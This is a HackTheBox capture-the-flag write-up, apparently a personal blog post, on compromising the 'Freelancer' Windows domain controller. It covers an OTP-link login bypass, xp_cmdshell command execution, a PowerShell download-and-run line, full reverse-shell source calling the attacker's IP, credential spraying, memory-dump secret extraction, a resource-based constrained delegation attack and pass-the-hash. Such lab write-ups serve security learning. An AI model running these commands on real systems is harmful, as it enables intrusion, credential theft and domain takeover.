3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=6/4%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=665EA414%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4h53m57s
| smb2-time: 
|   date: 2024-06-04T10:13:40
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53827/tcp): CLEAN (Timeout)
|   Check 2 (port 56435/tcp): CLEAN (Timeout)
|   Check 3 (port 55524/udp): CLEAN (Timeout)
|   Check 4 (port 39076/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
</code></pre><p>I added the freelancer.htb to /etc/hosts to make sure the site loads using <code>echo &quot;10.10.11.5 freelancer.htb&quot; &gt;&gt; /etc/hosts</code></p>
<p>This is how the freelancer site looks:</p>
<p>
    
    <input type="checkbox" id="zoomCheck-88413" hidden>
    <label for="zoomCheck-88413">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled.png" alt="Untitled" 
             />
    </label></p>
<p>In this site, we can create account for employer or freelancer.</p>
<p>I created a freelancer user with following details:</p>
<pre tabindex="0"><code>--&gt; freelancer info &lt;--
freelancer_rezy &gt; username
mail@gmail.com &gt; email
</code></pre><p>I will also create a account of employeer with following details:</p>
<pre tabindex="0"><code>--&gt; employer info &lt;---
employercoo_l &gt; username
erezrrrr1@gmail.com &gt; email
sdlhjkgbfdjksjkskjsdhjkfs &gt; password
fav movie &gt; spiderman
pet &gt; dog
friend&#39;s name &gt; john
</code></pre><p>The site has note that, after creating account for employer we aren‚Äôt able to login as it will be reviewed before it is activated.</p>
<p>I used the forget password functionality to change the password of the account employer to see if it allows us to login once we change the password. If yes the backend code has logic errors.</p>
<p>It worked and I changed the existing password to <code>spiderman123!</code> I tried to login with this new password, and it worked. I no more had to wait for review before accessing the site.</p>
<p>Looking around the website, and my eye was caught this QR code.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-da208" hidden>
    <label for="zoomCheck-da208">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%201.png" alt="Untitled" 
             />
    </label></p>
<p>So this link can let us login without using credentials.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-679c9" hidden>
    <label for="zoomCheck-679c9">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%202.png" alt="Untitled" 
             />
    </label></p>
<p>The link is in the format: where the base64 encoded is just the userID and MD5 Hash is the token. Hash changes every 5 minutes or everytime we logout and relogin.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-6c5c6" hidden>
    <label for="zoomCheck-6c5c6">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%203.png" alt="Untitled" 
             />
    </label></p>
<p>From here I see that I can login to any user through this link as long as I know the id of the user I need to login, and the md5 token will be changed after each login.</p>
<p>We need to enumerate the userID of admin or any other user who might have any higher permission than what we have right now.</p>
<p>I also found a comment to enumerate the users in this web app.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-da880" hidden>
    <label for="zoomCheck-da880">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%204.png" alt="Untitled" 
             />
    </label></p>
<p>I fuzzed the userId in this link: <code>http://freelancer.htb/accounts/profile/visit/$userID$/</code> and found that ID 2 = admin user.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-043a0" hidden>
    <label for="zoomCheck-043a0">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%205.png" alt="Untitled" 
             />
    </label></p>
<p>Now, I will use the userID to login to user admin.</p>
<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
<p>I visited the link: <code>http://freelancer.htb/accounts/login/otp/Mg==/6c5f75d2ed26ceec004a2f5eb155fcfd/</code> to login to user admin. Here <code>Mg==</code> is the base64 encoded form of ‚Äú2‚Äù. And the md5 hash is just the token given from QR. I didn‚Äôt change it.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-2e4a1" hidden>
    <label for="zoomCheck-2e4a1">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%206.png" alt="Untitled" 
             />
    </label></p>
<p>After exploring a bit, I found nothing. Then I used gobuster to bruteforce the website and found <code>/admin</code> endpoint. As i am already the user admin, I was able to access it:</p>
<p>
    
    <input type="checkbox" id="zoomCheck-9fbb1" hidden>
    <label for="zoomCheck-9fbb1">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%207.png" alt="Untitled" 
             />
    </label></p>
<p>Here, there is SQL Terminal in this admin endpoint. We can maybe try executing a code to get reverse shell from here.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-00f8d" hidden>
    <label for="zoomCheck-00f8d">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%208.png" alt="Untitled" 
             />
    </label></p>
<p>As it is Windows box, it is most likely MSSQL. So, I will use the rev shelll script from: <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands</a></p>
<p>First I used to impersonate as user System Admin. (<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users</a>)</p>
<pre tabindex="0"><code>EXECUTE AS LOGIN = &#39;sa&#39;
</code></pre><p>Then,</p>
<pre tabindex="0"><code>sp_configure &#39;show advanced options&#39;, &#39;1&#39;
RECONFIGURE
sp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;
RECONFIGURE

EXEC master..xp_cmdshell &#39;whoami&#39;
</code></pre><p>
    
    <input type="checkbox" id="zoomCheck-37537" hidden>
    <label for="zoomCheck-37537">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%209.png" alt="Untitled" 
             />
    </label></p>
<p>I can see it is sql_svc account.</p>
<p>Now, I ran:</p>
<pre tabindex="0"><code>EXECUTE xp_cmdshell &#39;powershell -c iex(iwr -usebasicparsing http://10.10.14.72:8000/revshell.ps1)&#39;
</code></pre><p>This downloads the reverse shell powershell script from my kali machine to target machine.</p>
<p>The script contents the following script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nb">Start-Sleep</span> <span class="n">-Seconds</span> <span class="mf">1</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$TCPClient</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="py">Sockets</span><span class="p">.</span><span class="py">TCPClient</span><span class="p">(</span><span class="s1">&#39;10.10.14.72&#39;</span><span class="p">,</span> <span class="mf">8888</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">until</span> <span class="p">(</span><span class="nv">$TCPClient</span><span class="p">.</span><span class="n">Connected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$NetworkStream</span> <span class="p">=</span> <span class="nv">$TCPClient</span><span class="p">.</span><span class="py">GetStream</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nv">$StreamWriter</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="py">StreamWriter</span><span class="p">(</span><span class="nv">$NetworkStream</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span><span class="w"> </span><span class="nb">WriteToStream</span> <span class="p">(</span><span class="nv">$String</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="no">byte[]</span><span class="p">]</span><span class="nv">$script:Buffer</span> <span class="p">=</span> <span class="mf">0</span><span class="p">..</span><span class="nv">$TCPClient</span><span class="p">.</span><span class="py">ReceiveBufferSize</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span><span class="mf">0</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="nv">$StreamWriter</span><span class="p">.</span><span class="py">Write</span><span class="p">(</span><span class="nv">$String</span> <span class="p">+</span> <span class="s1">&#39;H3K3R-SHELL[#]&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$StreamWriter</span><span class="p">.</span><span class="py">Flush</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">WriteToStream</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">((</span><span class="nv">$BytesRead</span> <span class="p">=</span> <span class="nv">$NetworkStream</span><span class="p">.</span><span class="py">Read</span><span class="p">(</span><span class="nv">$Buffer</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$Buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-gt</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$Command</span> <span class="p">=</span> <span class="p">([</span><span class="no">text.encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">).</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$Buffer</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$BytesRead</span> <span class="p">-</span> <span class="mf">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="nv">$Output</span> <span class="p">=</span> <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Invoke-Expression</span> <span class="nv">$Command</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-String</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$_</span> <span class="p">|</span> <span class="nb">Out-String</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>	
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="n">WriteToStream</span> <span class="p">(</span><span class="nv">$Output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$StreamWriter</span><span class="p">.</span><span class="py">Close</span><span class="p">()</span>
</span></span></code></pre></div><p>We get a reverse shell now:</p>
<p>
    
    <input type="checkbox" id="zoomCheck-ea21f" hidden>
    <label for="zoomCheck-ea21f">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2010.png" alt="Untitled" 
             />
    </label></p>
<p>At users directory, i can see users in this box:</p>
<p>
    
    <input type="checkbox" id="zoomCheck-b70ad" hidden>
    <label for="zoomCheck-b70ad">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2011.png" alt="Untitled" 
             />
    </label></p>
<p>As i am sql_svc user, I will try to enumerate the user sql_svc to see if there is anything interesting.</p>
<p>At Directory: <code>C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU</code></p>
<p>There are following files:</p>
<pre tabindex="0"><code>Directory: C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        5/27/2024   1:52 PM                1033_ENU_LP                                                           
d-----        5/27/2024   1:52 PM                redist                                                                
d-----        5/27/2024   1:52 PM                resources                                                             
d-----        5/27/2024   1:52 PM                x64                                                                   
-a----        9/24/2019   9:00 PM             45 AUTORUN.INF                                                           
-a----        9/24/2019   9:00 PM            784 MEDIAINFO.XML                                                         
-a----        9/29/2023   4:49 AM             16 PackageId.dat                                                         
-a----        9/24/2019   9:00 PM         142944 SETUP.EXE                                                             
-a----        9/24/2019   9:00 PM            486 SETUP.EXE.CONFIG                                                      
-a----        5/27/2024   4:58 PM            724 sql-Configuration.INI                                                 
-a----        9/24/2019   9:00 PM         249448 SQLSETUPBOOTSTRAPPER.DLL                                              
</code></pre><p>Where, <code>sql-Configuration.INI</code> file contains the following configurations:</p>
<pre tabindex="0"><code>SHELL&gt; cat sql-Configuration.INI
[OPTIONS]
ACTION=&#34;Install&#34;
QUIET=&#34;True&#34;
FEATURES=SQL
INSTANCENAME=&#34;SQLEXPRESS&#34;
INSTANCEID=&#34;SQLEXPRESS&#34;
RSSVCACCOUNT=&#34;NT Service\ReportServer$SQLEXPRESS&#34;
AGTSVCACCOUNT=&#34;NT AUTHORITY\NETWORK SERVICE&#34;
AGTSVCSTARTUPTYPE=&#34;Manual&#34;
COMMFABRICPORT=&#34;0&#34;
COMMFABRICNETWORKLEVEL=&#34;&#34;0&#34;
COMMFABRICENCRYPTION=&#34;0&#34;
MATRIXCMBRICKCOMMPORT=&#34;0&#34;
SQLSVCSTARTUPTYPE=&#34;Automatic&#34;
FILESTREAMLEVEL=&#34;0&#34;
ENABLERANU=&#34;False&#34; 
SQLCOLLATION=&#34;SQL_Latin1_General_CP1_CI_AS&#34;
SQLSVCACCOUNT=&#34;FREELANCER\sql_svc&#34;
SQLSVCPASSWORD=&#34;IL0v3ErenY3ager&#34;
</code></pre><p>Here, <code>SQLSVCPASSWORD=&quot;IL0v3ErenY3ager&quot;</code> is a password revealed. I will try to pass this password using crackmapexec to the users that were in users directory.</p>
<pre tabindex="0"><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/htb/freelancer]
‚îî‚îÄ$ crackmapexec smb 10.10.11.5 -u users.txt -p IL0v3ErenY3ager 
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
</code></pre><p>As we can see the password for the user <code>mikasaAckerman</code> is <code>IL0v3ErenY3ager</code>.</p>
<p>Now, I will upload runasCs to the box and try to inject the above credentials to the memory.</p>
<p>To upload runascs to my target machine, i will use command: <code>Invoke-WebRequest &quot;http://10.10.14.72:8000/RunasCs.exe&quot; -OutFile &quot;runascs.exe&quot;</code>  to my current <code>SHELL&gt;</code> session.</p>
<p>I ran <code>nc -nvlp 6969</code> then ran <code>./runascs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.72:6969</code> on my current windows rev shell.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-0bcd8" hidden>
    <label for="zoomCheck-0bcd8">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2012.png" alt="Untitled" 
             />
    </label></p>
<p>I see myself as mikasaAckerman user. And the desktop of this user contains the user flag.</p>
<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
<p>In the desktop of mikasaAckerman, alongside user.txt there is also mail.txt which contains:</p>
<pre tabindex="0"><code>Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the &#34;DATACENTER-2019&#34; computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server&#39;s CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
</code></pre><p>There is also MEMORY.7Z here. I downloaded the 7z file from windows box to my linux machine using python impacket smb server.</p>
<p>First I opened a smb server using command: <code>impacket-smbserver share . -smb2support -user rezy -password rezy</code>. And then mounted the share using:</p>
<pre tabindex="0"><code>$SharePath = &#34;\\10.10.14.72\share&#34;
$Username = &#34;rezy&#34;
$Password = &#34;rezy&#34;

# Create a credential object
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, (ConvertTo-SecureString -String $Password -AsPlainText -Force)

# Mount the SMB share
net use Z: $SharePath $Password /user:$Username /persistent:no
</code></pre><p>This will mount the smb share from linux to windows. Then to confirm I can do this:</p>
<pre tabindex="0"><code>PS C:\Users\mikasaAckerman\Desktop&gt; Get-PSDrive

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
Alias                                  Alias
C                  13.67          1.79 FileSystem    C:\                                                                                                                                                                    Users\Administrator\Documents
Cert                                   Certificate   \
Env                                    Environment
Function                               Function
HKCU                                   Registry      HKEY_CURRENT_USER
HKLM                                   Registry      HKEY_LOCAL_MACHINE
Variable                               Variable
WSMan                                  WSMan
Z          ...3478272.00          0.00 FileSystem    \\10.10.14.72\share
</code></pre><p>As we can see it‚Äôs Z drive. I can simply run:</p>
<pre tabindex="0"><code>Copy-Item -Path &#34;C:\Users\mikasaAckerman\Desktop\MEMORY.7z&#34; -Destination &#34;Z:\&#34;
</code></pre><p>to transfer file to the smb share and we can access it from our kali box.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-6ea76" hidden>
    <label for="zoomCheck-6ea76">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2013.png" alt="Untitled" 
             />
    </label></p>
<p>I then, used <a href="https://github.com/ufrisk/MemProcFS">https://github.com/ufrisk/MemProcFS</a> to dump the file and mount it.</p>
<p>I found the SAM, SYSTEM and SECURITY files in registry/hive_files. I Dumped it with secretsdump and I get a password: <code>PWN3D#l0rr@Armessa199</code> which is a password for the user <code>lorra199</code></p>
<p>I will login to it using <code>evil-winrm -i freelancer.htb -u lorra199 -p PWN3D#l0rr@Armessa199</code></p>
<p>
    
    <input type="checkbox" id="zoomCheck-d9bbc" hidden>
    <label for="zoomCheck-d9bbc">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2014.png" alt="Untitled" 
             />
    </label></p>
<p>Now, we need to syncronize the server time.</p>
<pre tabindex="0"><code>‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# ntpdate -u freelancer.htb 
2024-06-06 09:45:20.815434 (-0400) +17631.477286 +/- 0.038578 freelancer.htb 10.10.11.5 s1 no-leap
CLOCK: time stepped by 17631.477286
</code></pre><p>17631.477286 seconds is around 5 hours. So, I ran:</p>
<pre tabindex="0"><code>‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# faketime -f +5h bloodhound-python -c ALL -u lorra199 -p &#39;PWN3D#l0rr@Armessa199&#39; -d freelancer.htb -ns 10.10.11.5
INFO: Found AD domain: freelancer.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.freelancer.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.freelancer.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 13 computers
INFO: Connecting to LDAP server: dc.freelancer.htb
INFO: Found 30 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: SetupMachine.freelancer.htb
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: Datacenter-2019
INFO: Querying computer: DC.freelancer.htb
WARNING: Could not resolve: Datacenter-2019: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.5@53 answered The DNS operation timed out.
INFO: Done in 00M 17S
</code></pre><p>This generated json files in the directory where we ran the command. This will be the file we will upload it to bloodhound and enumerate it to find path to root.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-e72be" hidden>
    <label for="zoomCheck-e72be">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2015.png" alt="Untitled" 
             />
    </label></p>
<p>If you see the image above, lorra199 is member of AD REcycle bin group which has generic write permission to DC2.</p>
<p>So we can perform Resource Based <strong>Constrained Delegation,</strong> Using this a Domain admin can <strong>allow</strong> a computer to <strong>impersonate a user or computer</strong> against a <strong>service</strong> of a machine.</p>
<p>I will now run,</p>
<pre tabindex="0"><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ impacket-addcomputer -computer-name &#39;HEKER$&#39; -computer-pass &#39;Heker123@!&#39; -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:&#39;PWN3D#l0rr@Armessa199&#39; 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account HEKER$ with password Heker123@!.
</code></pre><p>The <code>impacket-addcomputer</code> command is used to add a computer account to a domain</p>
<p>Now we will use impacket rbcd to delegate:</p>
<pre tabindex="0"><code>impacket-rbcd -delegate-from &#39;HEKER$&#39; -delegate-to &#39;DC$&#39; -dc-ip 10.10.11.5 -action &#39;write&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;
</code></pre><ul>
<li><code>delegate-from 'HEKER$'</code>: Specifies the computer account that will delegate permissions. In this case, it&rsquo;s &ldquo;HEKER$&rdquo;.</li>
<li><code>delegate-to 'DC$'</code>: Specifies the computer account that will receive the delegated permissions. In this case, it&rsquo;s &ldquo;DC$&rdquo;.</li>
<li><code>dc-ip 10.10.11.5</code>: Specifies the IP address of the domain controller. In this case, it&rsquo;s &ldquo;10.10.11.5&rdquo;.</li>
<li><code>action 'write'</code>: Specifies the action to be taken. In this case, it&rsquo;s &ldquo;write&rdquo;, which means it will write the delegation settings.</li>
<li><code>'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'</code>: Specifies the domain and credentials used to authenticate. In this case, it&rsquo;s the &ldquo;freelancer.htb&rdquo; domain, with the username &ldquo;lorra199&rdquo; and password &ldquo;PWN3D#l0rr@Armessa199&rdquo;.</li>
</ul>
<pre tabindex="0"><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ impacket-rbcd -delegate-from &#39;HEKER$&#39; -delegate-to &#39;DC$&#39; -dc-ip 10.10.11.5 -action &#39;write&#39; &#39;freelancer.htb/lorra199:PWN3D#l0rr@Armessa199&#39;
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Accounts allowed to act on behalf of other identity:
[*]     rbcd_account$   (S-1-5-21-3542429192-2036945976-3483670807-11604)
[*]     parrot$      (S-1-5-21-3542429192-2036945976-3483670807-11601)
[*]     BIGNAMEMUST$   (S-1-5-21-3542429192-2036945976-3483670807-11605)
[*]     ATTACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11603)
[*]     WINGER$      (S-1-5-21-3542429192-2036945976-3483670807-11606)
[*]     WINGERABCDEFG$   (S-1-5-21-3542429192-2036945976-3483670807-11607)
[*]     ATTATTATTATTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11608)
[*]     HACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11609)
[*] Delegation rights modified successfully!
[*] HEKER$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     rbcd_account$   (S-1-5-21-3542429192-2036945976-3483670807-11604)
[*]     parrot$      (S-1-5-21-3542429192-2036945976-3483670807-11601)
[*]     BIGNAMEMUST$   (S-1-5-21-3542429192-2036945976-3483670807-11605)
[*]     ATTACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11603)
[*]     WINGER$      (S-1-5-21-3542429192-2036945976-3483670807-11606)
[*]     WINGERABCDEFG$   (S-1-5-21-3542429192-2036945976-3483670807-11607)
[*]     ATTATTATTATTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11608)
[*]     HACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11609)
[*]     HEKER$       (S-1-5-21-3542429192-2036945976-3483670807-11610)
</code></pre><p>Now we can see we are able to act on behalf of other identity. Now i will use impcket to get service ticket from dc.</p>
<pre tabindex="0"><code>faketime -f +5h impacket-getST -spn &#39;cifs/dc.freelncer.htb&#39; -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/HEKER$:&#39;Heker123@!&#39;
</code></pre><p>
    
    <input type="checkbox" id="zoomCheck-35b3f" hidden>
    <label for="zoomCheck-35b3f">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2016.png" alt="Untitled" 
             />
    </label></p>
<p>i will now import the ticket and use secretsdump to get the hash of admin account.</p>
<p>To import the ticket, I will simply do <code>export KRB5CCNAME=Administrator.ccache</code> and run the following command:</p>
<pre tabindex="0"><code>faketime -f +5h impacket-secretsdump &#39;freelancer.htb/Administrator@DC.freelancer.htb&#39; -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
</code></pre><p>We will recieve Hash for user accounts in this DC along with Administrator‚Äôs. Now, i will simply use the hash of Administrator and pass the hash with evil-winrm to get access to root account.</p>
<pre tabindex="0"><code>‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ evil-winrm -i freelancer.htb -u administrator -H 0039318f1e8274633445bce32ad1a290
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
freelancer\administrator
</code></pre><p>As you can see, we got to administrator as well and got root flag too.</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Thanks for following my walk-through on this fun AD box.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/hackthebox/">HackTheBox</a></li>
      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
      <li><a href="http://localhost:1313/tags/hard/">Hard</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/writeups/hackthebox/blurry/">
    <span class="title">¬´ Prev</span>
    <br>
    <span>Blurry Writeup - HackTheBox</span>
  </a>
  <a class="next" href="http://localhost:1313/writeups/hackthebox/boardlight/">
    <span class="title">Next ¬ª</span>
    <br>
